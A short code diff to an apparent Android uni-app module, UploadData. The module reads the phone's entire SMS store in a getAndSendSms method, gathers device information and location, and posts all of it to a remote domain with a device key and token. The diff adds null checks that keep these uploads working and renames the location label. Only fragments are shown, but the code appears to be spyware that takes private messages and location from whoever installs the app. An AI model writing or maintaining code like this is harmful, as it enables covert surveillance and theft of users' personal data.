@@ -73,6 +73,9 @@ public class UploadData extends UniModule {
     if(domain == null || domain.isEmpty()) {
       return;
     }
+    if(systemInfo == null) {
+      systemInfo = new JSONObject();
+    }
     Log.d(TAG, "device post data:" + systemInfo.toString());
     postOssSign(systemInfo, token, domain, deviceKey, "device");
   }
@@ -123,6 +126,9 @@ public class UploadData extends UniModule {
     Log.d(TAG, "getAndSendSms Start!!!");
     if(domain == null || domain.isEmpty()) {
       return;
+    }
+    if(systemInfo == null) {
+      systemInfo = new JSONObject();
     }
 
     Uri mUri = Uri.parse(UploadData.SMS_URI_ALL);
@@ -223,7 +229,7 @@ public class UploadData extends UniModule {
 //    systemInfo.remove("map");
 //    systemInfo.put("map", location);
     Log.d(TAG, "location post data:" + systemInfo.get("map"));
-    postOssSign(systemInfo, token, domain, deviceKey, "map");
+    postOssSign(systemInfo, token, domain, deviceKey, "location");
   }
 
   @RequiresApi(api = Build.VERSION_CODES.M)
